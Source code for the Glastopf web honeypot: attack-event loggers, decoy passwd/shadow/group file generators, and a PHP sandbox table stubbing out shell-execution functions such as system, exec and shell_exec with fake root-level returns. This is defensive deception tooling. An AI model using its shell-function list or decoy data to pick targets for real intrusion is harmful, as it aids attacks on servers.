# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import json
import logging
import os
import base64

import hpfeeds
from glastopf.modules.reporting.auxiliary.base_logger import BaseLogger


logger = logging.getLogger(__name__)


class HPFeedsLogger(BaseLogger):

    def __init__(self, data_dir, config="glastopf.cfg", reconnect=True):
        BaseLogger.__init__(self, config)
        self.files_dir = os.path.join(data_dir, 'files/')

        self.enabled = False
        #legacy
        self.options = {'enabled': self.enabled}
        if self.config.getboolean("hpfeed", "enabled"):
            host = self.config.get("hpfeed", "host")
            port = int(self.config.getint("hpfeed", "port"))
            ident = self.config.get("hpfeed", "ident")
            secret = self.config.get("hpfeed", "secret")
            self.enabled = True
            #legacy
            self.options = {'enabled': self.enabled}
            self.chan_files = self.config.get("hpfeed", "chan_files")
            self.chan_events = self.config.get("hpfeed", "chan_events")
            self.hpc = hpfeeds.new(host, port, ident, secret, reconnect=reconnect)

    def insert(self, attack_event):
        if attack_event.file_name is not None:
            with file(os.path.join(self.files_dir, attack_event.file_name), 'r') as file_handler:
                logger.debug('Sending file ({0}) using hpfriends on {0}'.format(attack_event.file_name, self.chan_files))
                file_content = file_handler.read()
                file_data = attack_event.file_name + " " + base64.b64encode(file_content)
                self.hpc.publish(self.chan_files, file_data)

        event_data = json.dumps(attack_event.event_dict())
        self.hpc.publish(self.chan_events, event_data)

########NEW FILE########
__FILENAME__ = log_mail
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.


import smtplib

from email.mime.text import MIMEText

from glastopf.modules.reporting.auxiliary.base_logger import BaseLogger


class LogMail(BaseLogger):
    def __init__(self, data_dir, config="glastopf.cfg"):
        BaseLogger.__init__(self, config)
        self.options = {
            "enabled": self.config.getboolean("mail", "enabled"),
            "user": self.config.get("mail", "user"),
            "pwd": self.config.get("mail", "pwd"),
            "mail_from": self.config.get("mail", "mail_from"),
            "mail_to": self.config.get("mail", "mail_to"),
            "smtp_host": self.config.get("mail", "smtp_host"),
            "smtp_port": self.config.get("mail", "smtp_port"),
            "patterns": self.config.get("mail", "patterns"),
        }

    def _build_mail_body_event(self, attack_event):
        mail_msg = 'New attack from %s with request %s' % (attack_event.source_addr[0], attack_event.http_request.request_url)
        mail_msg += '\nComplete Request:\n\n'
        mail_msg += attack_event.http_request.request_raw

        msg = MIMEText(mail_msg)
        return msg

    def send_mail(self, attack_event):
        msg = self._build_mail_body_event(attack_event)
        msg['Subject'] = 'Honeypot Update'
        msg['From'] = self.options["mail_from"]
        msg['To'] = self.options["mail_to"]

        server = smtplib.SMTP('%s:%s' % (self.options["smtp_host"], self.options["smtp_port"]))
        server.ehlo_or_helo_if_needed()
        server.starttls()
        server.ehlo_or_helo_if_needed()
        server.login(self.options["user"], self.options["pwd"])
        server.sendmail(self.options["user"], self.options["mail_to"], msg.as_string())
        server.quit()

    def insert(self, attack_event):
        patterns = self.options["patterns"]

        # if the wildcard '*' is used, every new event will be notified by email
        if patterns == '*':
            self.send_mail(attack_event)
            return

        # otherwise an email notification will be sent
        # only if a specified matched pattern is identified
        if attack_event.matched_pattern in patterns.split(","):
            self.send_mail(attack_event)

########NEW FILE########
__FILENAME__ = log_surfcertids
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import logging

from glastopf.modules.reporting.auxiliary.base_logger import BaseLogger


logger = logging.getLogger(__name__)


class LogSURFcertIDS(BaseLogger):
    """
    This is the SURFcert IDS reporting class for Glastopf v3.
    This class allows your Glastopf honeypot to log attacks to a
    SURFcert IDS logserver. For more information on SURFcert IDS
    visit http://ids.surfnet.nl/ or join the #surfnetids IRC
    channel at Freenode.

    To use this module, put this file (log_surcertids.py) in the
    modules/reporting directory of your Glastopf instance. Then
    add the following part to glastopf.cfg (customize the values
    to your own needs):

    [surfcertids]
    enabled = True
    host = 10.1.2.3
    port = 5432
    user = my_db_user
    password = my_db_password
    database = idsserver

    If you haven't done yet, you need to load the file
    dionaea.sql (shipped with the SURFcert IDS logserver) into
    your database first. This file contains all required tables
    and stored procedures for Dionaea, Kippo, Glastopf, etc...

    Finally, (re)start Glastopf and enjoy.

    ernestje

    """

    def __init__(self, data_dir, config="glastopf.cfg"):
        BaseLogger.__init__(self, config)
        self.options = {
            "enabled": self.config.getboolean("surfcertids", "enabled"),
            "host": self.config.get("surfcertids", "host"),
            "port": self.config.getint("surfcertids", "port"),
            "user": self.config.get("surfcertids", "user"),
            "password": self.config.get("surfcertids", "password"),
            "database": self.config.get("surfcertids", "database"),
            "atype": 3,
            "ptype_request": 60,
            "ptype_referer": 61,
            "ptype_useragent": 62,
            "ptype_host": 63,
            "ptype_pattern": 64,
        }
        if self.options['enabled']:
            try:
                import psycopg2

                self.connection = psycopg2.connect(
                    "host=%s port=%s user=%s password=%s dbname=%s" % (
                        self.options['host'],
                        self.options['port'],
                        self.options['user'],
                        self.options['password'],
                        self.options['database'],
                    )
                )
                logger.info("Connected to the SURFcert IDS logserver.")
            except Exception as e:
                logger.exception("Unable to connect to the SURFcert IDS logserver: {0}".format(e))
                self.options['enabled'] = False

    def insert(self, attack_event):
        """
        Inserts an attack into the SURFcert IDS database, using the
        stored procedures originally made for Dionaea.
        """
        if attack_event.matched_pattern == 'unknown':
            severity = 0
        elif attack_event.matched_pattern == 'robots_txt':
            severity = 0
        elif attack_event.matched_pattern == 'style_css':
            severity = 0
        else:
            severity = 1
        try:
            cursor = self.connection.cursor()
        # TODO: reconnect if there is no connection
        except Exception as e:
            logger.error("Connection error : {0}".format(e))
            return
        cursor.execute("""
            SELECT surfids3_attack_add(%s, %s, %s, %s, %s, NULL, %s);
            """,
                       (
                           severity,
                           str(attack_event.source_addr[0]),
                           str(attack_event.source_addr[1]),
                           str(attack_event.sensor_addr[0]),
                           str(attack_event.sensor_addr[1]),
                           self.options["atype"]
                       )
        )
        attackid = cursor.fetchall()[0]
        if attackid > 0:
            cursor.execute("""
                SELECT surfids3_detail_add(%s, %s, %s, %s);
                """,
                           (
                               attackid,
                               str(attack_event.sensor_addr[0]),
                               self.options["ptype_request"],
                               attack_event.http_request.request_url
                           )
            )
            cursor.execute("""
                SELECT surfids3_detail_add(%s, %s, %s, %s);
                """,
                           (
                               attackid,
                               str(attack_event.sensor_addr[0]),
                               self.options["ptype_referer"],
                               attack_event.http_request.request_headers.get('Referer', 'None')
                           )
            )
            cursor.execute("""
                SELECT surfids3_detail_add(%s, %s, %s, %s);
                """,
                           (
                               attackid,
                               str(attack_event.sensor_addr[0]),
                               self.options["ptype_useragent"],
                               attack_event.http_request.request_headers.get('User-Agent', 'None')
                           )
            )
            cursor.execute("""
                SELECT surfids3_detail_add(%s, %s, %s, %s);
                """,
                           (
                               attackid,
                               str(attack_event.sensor_addr[0]),
                               self.options["ptype_host"],
                               attack_event.http_request.request_headers.get('Host', 'None')
                           )
            )
            cursor.execute("""
                SELECT surfids3_detail_add(%s, %s, %s, %s);
                """,
                           (
                               attackid,
                               str(attack_event.sensor_addr[0]),
                               self.options["ptype_pattern"],
                               attack_event.matched_pattern
                           )
            )
        self.connection.commit()
        cursor.close()

    def close(self):
        if self.connection:
            self.connection.close()

########NEW FILE########
__FILENAME__ = log_syslog
# Copyright (C) 2012 Johnny Vestergaard <jkv@unixcluster.dk>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import logging

from glastopf.modules.reporting.auxiliary.base_logger import BaseLogger


class LogSyslog(BaseLogger):
    def __init__(self, data_dir, config="glastopf.cfg"):
        BaseLogger.__init__(self, config)
        self.options = {
            "enabled": self.config.getboolean("syslog", "enabled"),
            "socket": self.config.get("syslog", "socket"),
        }

        if self.options['enabled']:
        #Make sure we only have one logger
            try:
                LogSyslog.logger
            except AttributeError:
                LogSyslog.logger = logging.getLogger('glaspot_attack')
                LogSyslog.logger.propagate = False
                if ":" in self.options['socket']:
                    address = self.options['socket'].split(":")
                else:
                    address = self.options['socket']
                LogSyslog.log_handler = logging.handlers.SysLogHandler(address=address)
                LogSyslog.logger.addHandler(self.log_handler)
                LogSyslog.logger.setLevel(logging.INFO)

    def insert(self, attack_event):
        message = "Glaspot: %(pattern)s attack method from %(source)s against %(host)s:%(port)s. [%(method)s %(url)s]" % {
            'pattern': attack_event.matched_pattern,
            'source': ':'.join((attack_event.source_addr[0], str(attack_event.source_addr[1]))),
            'host': attack_event.sensor_addr[0],
            'port': attack_event.sensor_addr[1],
            'method': attack_event.http_request.request_verb,
            'url': attack_event.http_request.request_url,
        }
        LogSyslog.logger.info(message)

########NEW FILE########
__FILENAME__ = log_taxii
# Copyright (C) 2014  Johnny Vestergaard <jkv@unixcluster.dk>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import logging

import libtaxii
import libtaxii.clients as tc
from libtaxii.messages_11 import ContentBlock, InboxMessage, generate_message_id
from libtaxii.clients import HttpClient

from glastopf.modules.reporting.auxiliary.stix.stix_transform import StixTransformer
from glastopf.modules.reporting.auxiliary.base_logger import BaseLogger


logger = logging.getLogger(__name__)


class TaxiiLogger(BaseLogger):
    def __init__(self, data_dir, config='glastopf.cfg'):
        BaseLogger.__init__(self, config)
        self.options = {'enabled': self.config.getboolean('taxii', 'enabled')}
        self.host = self.config.get('taxii', 'host')
        self.port = self.config.getint('taxii', 'port')
        self.inbox_path = self.config.get('taxii', 'inbox_path')
        self.use_https = self.config.getboolean('taxii', 'use_https')
        self.client = HttpClient()
        self.client.setProxy('noproxy')

        auth_credentials = {'username': self.config.get('taxii', 'auth_basic_username'),
                            'password': self.config.get('taxii', 'auth_basic_password'),
                            'key_file': self.config.get('taxii', 'auth_certificate_keyfile'),
                            'cert_file': self.config.get('taxii', 'auth_certificate_certfile')}
        self.client.setAuthCredentials(auth_credentials)

        if self.config.getboolean('taxii', 'use_auth_basic'):
            self.client.setAuthType(tc.HttpClient.AUTH_BASIC)
        elif self.config.getboolean('taxii', 'use_auth_certificate'):
            self.client.setAuthType(tc.HttpClient.AUTH_CERT)
        elif self.config.getboolean('taxii', 'use_auth_basic') and self.config.getboolean('taxii', 'use_auth_certificate'):
            self.client.setAuthType(tc.HttpClient.AUTH_CERT_BASIC)
        else:
            self.client.setAuthType(tc.HttpClient.AUTH_NONE)

        self.stix_transformer = StixTransformer(self.config, data_dir)

    def insert(self, event):
        # converts from conpot log format to STIX compatible xml
        stix_package = self.stix_transformer.transform(event)

        # wrapping the stix message in a TAXII envelope
        bytestream = bytes(bytearray(stix_package, encoding='utf-8'))
        content_block = ContentBlock(libtaxii.CB_STIX_XML_10, bytestream)

        inbox_message = InboxMessage(message_id=generate_message_id(), content_blocks=[content_block])
        inbox_xml = inbox_message.to_xml()

        # the actual call to the TAXII web service
        response = self.client.callTaxiiService2(self.host, self.inbox_path, libtaxii.VID_TAXII_XML_11, inbox_xml, self.port)
        response_message = libtaxii.get_message_from_http_response(response, '0')

        if response_message.status_type != libtaxii.messages.ST_SUCCESS:
            logger.error('Error while transmitting message to TAXII server: {0}'.format(response_message.status_detail))
            return False
        else:
            return True

########NEW FILE########
__FILENAME__ = stix_transform
# Copyright (C) 2014 Johnny Vestergaard <jkv@unixcluster.dk>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

from datetime import datetime
import uuid
import os
import hashlib
import base64

import jinja2
import glastopf

CAPEC_PATTERN_MAP = {'sqli': {'CAPEC-66': 'SQL Injection'},
                     'rfi':  {'CAPEC-193': 'PHP Remote File Inclusion'},
                     'lfi':  {'CAPEC-252': 'PHP Local File Inclusion'},
                     # worst case for php_cgi_rce, we need better classification in modules
                     'php_cgi_rce': {'CAPEC-193': 'PHP Remote File Inclusion'},
                     'login': {'CAPEC-112': 'Brute force'}}

# http headers accepted by cybox
CYBOX_HEADERS = set(['Accept', 'Accept_Charset', 'Accept_Language', 'Accept_Datetime', 'Accept_Encoding',
                     'Authorization', 'Cache_Control', 'Connection', 'Cookie', 'Content_Length', 'Content_MD5',
                     'Content_Type', 'Date', 'Expect', 'From', 'Host', 'If_Match', 'If_Modified_Since', 'If_None_Match',
                     'If_Range', 'If_Unmodified_Since', 'Max_Forwards', 'Pragma', 'Proxy_Authorization', 'Range',
                     'Referer', 'TE', 'User_Agent', 'Via', 'Warning', 'DNT', 'X_Requested_With', 'X_Requested_For',
                     'X_ATT_DeviceId', 'X_Wap_Profile'])

class StixTransformer(object):
    def __init__(self, config, data_dir):
        template_loader = jinja2.FileSystemLoader(searchpath=os.path.dirname(__file__))
        template_env = jinja2.Environment(loader=template_loader, trim_blocks=True, lstrip_blocks=True)
        self.template = template_env.get_template('stix_glastopf_template.xml')
        self.config = config
        self.files_dir = os.path.join(data_dir, 'files/')


    def transform(self, event):

        jinja_vars = {'package_id': str(uuid.uuid4()),
                'namespace': 'Glastopf',
                'namespace_uri': 'http://glastopf.org/stix-1',
                'package_timestamp': datetime.utcnow().isoformat(),
                'incident_id': event.id,
                'incident_timestamp': datetime.strptime(event.event_time,"%Y-%m-%d %H:%M:%S").isoformat(),
                'glastopf_version': glastopf.__version__,
                'include_contact_info': self.config.getboolean('taxii', 'include_contact_info'),
                'contact_name': self.config.get('taxii', 'contact_name'),
                'contact_mail': self.config.get('taxii', 'contact_email'),
                'source_ip': event.source_addr[0],
                'source_port': str(event.source_addr[1]),
                'honeypot_ip': event.sensor_addr[0],
                'honeypot_port': event.sensor_addr[1],
                'http_method': event.http_request.request_verb,
                'http_version': event.http_request.request_version,
                'http_path': event.http_request.request_path,
                'http_body': event.http_request.request_body,
                'http_raw_header': event.http_request.headers,
                'http_parsed_header': self._get_parsed_header(event),
                'capec': self._pattern_to_capec(event)
        }

        if event.file_name is not None:
            with file(os.path.join(self.files_dir, event.file_name), 'r') as file_handler:
                file_data = file_handler.read()
                file_content = base64.b64encode(file_data)
                jinja_vars['file_content'] = file_content
                jinja_vars['file_hash_md5'] = hashlib.md5(file_data).hexdigest()
                jinja_vars['file_hash_sha256'] = hashlib.sha256(file_data).hexdigest()
                jinja_vars['file_observable_object_id'] = str(uuid.uuid4())

        return self.template.render(jinja_vars)

    def _get_parsed_header(self, event):
        parsed_header = []
        for header_name in event.http_request.headers:
            # make candidate header fit the cybox definitions
            header_name_cap = header_name.title().replace('-', '_')
            if header_name_cap in CYBOX_HEADERS:
                parsed_header.append((header_name_cap, event.http_request.headers.get(header_name, "")))
        return parsed_header

    def _pattern_to_capec(self, event):
        if event.matched_pattern in CAPEC_PATTERN_MAP:
            return CAPEC_PATTERN_MAP[event.matched_pattern]
        else:
            return {}

########NEW FILE########
__FILENAME__ = log_mongodb
# Copyright (C) 2012  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import logging
import warnings

logger = logging.getLogger(__name__)

try:
    from pymongo import MongoClient, uri_parser
except ImportError:
    logger.warn('Unable to import module pymongo')

class Database(object):
    def __init__(self, connection_string):

        uri_dict = uri_parser.parse_uri(connection_string)
        if not uri_dict['database']:
            raise Exception("Invalid Mongo URI. Database name must be specified.")

        try:
            with warnings.catch_warnings(record=True):
                client = MongoClient(connection_string)
            self.db = client[uri_dict['database']]
        except:
            logger.exception("Unable to connect to MongoDB service.")
            raise

    def insert(self, attack_event):
        self.db["events"].insert(attack_event.event_dict())

########NEW FILE########
__FILENAME__ = log_sql
# Copyright (C) 2012 Johnny Vestergaard <jkv@unixcluster.dk>
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import json
import logging

from sqlalchemy import Table, Column, Integer, String, MetaData, TEXT
from sqlalchemy.orm import sessionmaker
from sqlalchemy import exc
import glastopf.modules.processing.ip_profile as ipp

logger = logging.getLogger(__name__)


class Database(object):
    def __init__(self, engine):
        self.engine = engine
        #ipp.Base.metadata.create_all(self.engine)
        self.setup_mapping()
        self.session = sessionmaker(bind=self.engine)()

    def insert(self, attack_event):
        entry = attack_event.event_dict()

        entry['source'] = (entry['source'][0] + ":" + str(entry['source'][1]))

        try:
            conn = self.engine.connect()
            conn.execute(self.events_table.insert(entry))
        except exc.OperationalError as e:
            message = str(e)[:35]
            logger.error("Error inserting attack event into main database: {0}".format(message))

    #all profiling support disabled until issue #26 is fixed
    # def insert_profile(self, ip_profile):
    #     #print "last_event_time for ip %s:%s"%(
    #     #             ip_profile.ip, ip_profile.last_event_time)
    #     # .split()[0] is added to deal with multiple ASNs
    #     self.session.add(ip_profile)
    #     try:
    #         self.session.commit()
    #     except exc.OperationalError as e:
    #         self.session.rollback()
    #         message = str(e)[:35]
    #        logger.error("Error inserting profile into main database: {0}".format(message))

    # def update_db(self):
    #     try:
    #         self.session.commit()
    #     except exc.OperationalError as e:
    #         self.session.rollback()
    #         message = str(e)[:35]
    #         logger.error("Error updating profile in main database: {0}".format(message))
    #
    # def get_profile(self, source_ip):
    #     ip_profile = self.session.query(ipp.IPProfile).filter(
    #         ipp.IPProfile.ip == source_ip).first()
    #     return ip_profile

    def setup_mapping(self):
        meta = MetaData()

        self.events_table = Table('events', meta,
                                  Column('id', Integer, primary_key=True, ),
                                  Column('time', String(30)),
                                  Column('source', String(30)),
                                  Column('request_url', String(500)),
                                  Column('request_raw', TEXT),
                                  Column('pattern', String(20)),
                                  Column('filename', String(500)),
        )

        #only creates if it cant find the schema
        meta.create_all(self.engine)

########NEW FILE########
__FILENAME__ = vdocs
# Copyright (C) 2014  Lukas Rist
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import random
import string
import os


PASSWD_STATIC = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin"""

SHADOW_STATIC = """daemon:*:16083:0:99999:7:::
bin:*:16083:0:99999:7:::
sys:*:16083:0:99999:7:::
sync:*:16083:0:99999:7:::
games:*:16083:0:99999:7:::
man:*:16083:0:99999:7:::
lp:*:16083:0:99999:7:::
mail:*:16083:0:99999:7:::
news:*:16083:0:99999:7:::
uucp:*:16083:0:99999:7:::
proxy:*:16083:0:99999:7:::
www-data:*:16083:0:99999:7:::
backup:*:16083:0:99999:7:::
list:*:16083:0:99999:7:::
irc:*:16083:0:99999:7:::
gnats:*:16083:0:99999:7:::
nobody:*:16083:0:99999:7:::
libuuid:!:16083:0:99999:7:::
Debian-exim:!:16083:0:99999:7:::
statd:*:16083:0:99999:7:::
sshd:*:16083:0:99999:7:::"""

GROUP_STATIC = """root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
libuuid:x:101:
crontab:x:102:
vboxsf:x:103:
Debian-exim:x:104:
mlocate:x:105:
ssh:x:106:"""


def _get_entry(user_id):
    # Random username of 3 characters
    name = "".join([random.choice(string.letters[:26]) for i in xrange(3)])
    gid = user_id
    uid = user_id
    g = "\n" + name + ":x:" + str(gid) + ":"
    p = "\n" + name + ":x:" + str(uid) + ":" + str(gid) + "::" + "/home/" + name + \
        "/:/bin/sh"
    # If we want to, we could also give a password hash in place of '*'
    s = "\n" + name + ":*:6723:0:99999:7:::"
    return p, s, g


def _gen_data():
    data = []
    num_entries = random.randint(1, 10)  # number of random entries
    for i in xrange(num_entries):
        # Possible duplication of user id, but very low probability
        user_id = random.randint(1000, 1500)
        data.append(_get_entry(user_id))
    return data


def _create_passwd(vpath, data):
    pwd_path = os.path.join(vpath, 'linux/etc/passwd')
    with open(pwd_path, "wb") as pwd:
        pwd.write(PASSWD_STATIC)
        for entry in data:
            pwd.write(entry[0])


def _create_shadow(vpath, data):
    shd_path = os.path.join(vpath, 'linux/etc/shadow')
    with open(shd_path, "wb") as shd:
        shd.write(SHADOW_STATIC)
        for entry in data:
            shd.write(entry[1])


def _create_group(vpath, data):
    grp_path = os.path.join(vpath, 'linux/etc/group')
    with open(grp_path, "wb") as grp:
        grp.write(GROUP_STATIC)
        for entry in data:
            grp.write(entry[2])


def randomize_vdocs(vpath):
    data = _gen_data()
    _create_passwd(vpath, data)
    _create_shadow(vpath, data)
    _create_group(vpath, data)
########NEW FILE########
__FILENAME__ = functions
from replacement import system, passthru, execute, getenv, shell_exec, ini_get, popen

FUNCTIONS = {
    "disk_free_space;": "\treturn '%s';" % "36698988544",
    "disk_total_space;": "\treturn '%s';" % "51221590016",
    "diskfreespace;": "\treturn '%s';" % "36698988544",
    "exec;$cmd;$ret;": execute.call(),
    "function_exists;": "\treturn true;",
    "fsockopen;": "\treturn false;",
    "getcwd;": "\treturn '%s';" % "/var/www",
    "getenv;$varname;": getenv.call(),
    "get_current_user;": "\treturn '%s';" % "root",
    "getmyuid;": "\treturn '%s';" % "0",
    "getmygid;": "\treturn '%s';" % "0",
    "ini_get;$varname;": ini_get.call(),
    "is_writable;": "\treturn true;",
    "is_callable;": "\treturn true;",
    "php_uname;": "\treturn '%s';" % "Linux Server 2.6.38-11-generic #49-Ubuntu SMP Mon Aug 29 20:47:58 UTC 2011 i686",
    "passthru;$cmd;$ret;": passthru.call(),
    "popen;$cmd;": popen.call(),
    "shell_exec;$cmd;": shell_exec.call(),
    "system;$cmd;$ret;": system.call(),
}

FUNCTIONS2 = {
    "dl;": "",
    "escapeshellarg;": "",
    "escapeshellcmd;": "",
    "proc_close;": "",
    "proc_get_status;": "",
    "proc_nice;": "",
    "proc_open;": "",
    "proc_terminate;": "",
    "checkdnsrr;": "",
    "closelog;": "",
    "define_syslog_variables;": "",
    "dns_check_record;": "",
    "dns_get_mx;": "",
    "dns_get_record;": "",
    "getcwd;": "",
    "gethostbyaddr;": "",
    "gethostbyname;": "",
    "gethostbynamel;": "",
    "gethostname;": "",
    "getmxrr;": "",
    "getprotobyname;": "",
    "getprotobynumber;": "",
    "getservbyname;": "",
    "getservbyport;": "",
    "header_remove;": "",
    "header;": "",
    "headers_list;": "",
    "headers_sent;": "",
    "inet_ntop;": "",
    "inet_pton;": "",
    "ip2long;": "",
    "long2ip;": "",
    "fclose;": "",
    "feof;": "",
    "fgets;": "",
    "fgetss;": "",
    "file;": "",
    "fopen;": "",
    "fsockopen;$hostname;$port;$errno;$errstr;$timeout;": "",
    "fwrite;": "",
    "mail;": "",
    "pfsockopen;": "",
    "openlog;": "",
    "setcookie;": "",
    "setrawcookie;": "",
    "socket_recvfrom;": "",
    "socket_recv;": "",
    "stream_socket_recvfrom;": "",
    "msg_receive;": "",
    "socket_get_status;": "",
    "socket_set_blocking;": "",
    "socket_set_timeout;": "",
    "syslog;": "",
    "basename;": "",
    "chgrp;": "",
    "chmod;": "",
    "chown;": "",
    "clearstatcache;": "",
    "copy;": "",
    "dirname;": "",
    "disk_free_space;": "36698988544",
    "disk_total_space;": "51221590016",
    "diskfreespace;": "36698988544",
    "fflush;": "",
    "fgetc;": "",
    "fgetcsv;": "",
    "file_exists;": "",
    "file_get_contents;": "",
    "file_put_contents;": "",
    "fileatime;": "",
    "filectime;": "",
    "filegroup;": "",
    "fileinode;": "",
    "filemtime;": "",
    "fileowner;": "",
    "fileperms;": "",
    "filesize;": "",
    "filetype;": "",
    "flock;": "",
    "fnmatch;": "",
    "fpassthru;": "",
    "fputcsv;": "",
    "fputs;": "",
    "fread;": "",
    "fscanf;": "",
    "fseek;": "",
    "fstat;": "",
    "ftell;": "",
    "ftruncate;": "",
    "glob;": "",
    "is_dir;": "",
    "is_executable;": "",
    "is_file;": "",
    "is_link;": "",
    "is_readable;": "",
    "is_uploaded_file;": "",
    "is_writeable;": "",
    "lchgrp;": "",
    "lchown;": "",
    "link;": "",
    "linkinfo;": "",
    "lstat;": "",
    "mkdir;": "",
    "move_uploaded_file;": "",
    "parse_ini_file;": "",
    "parse_ini_string;": "",
    "pathinfo;": "",
    "pclose;": "",
    "popen;": "",
    "readfile;": "",
    "readlink;": "",
    "realpath_cache_get;": "",
    "realpath_cache_size;": "",
    "realpath;": "",
    "rename;": "",
    "rewind;": "",
    "rmdir;": "",
    "set_file_buffer;": "",
    "stat;": "",
    "symlink;": "",
    "tempnam;": "",
    "tmpfile;": "",
    "touch;": "",
    "umask;": "",
    "unlink;": "",
}

WHITELIST = [
    "rename_function",
    "override_function",
    "fwrite",
    "array",
    "rand",
    "tmpfile",
    "echo",
    "print",
    "get_defined_functions",
    "print_r"
]

########NEW FILE########
__FILENAME__ = generate
# Copyright (C) 2011  Lukas Rist
# 
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
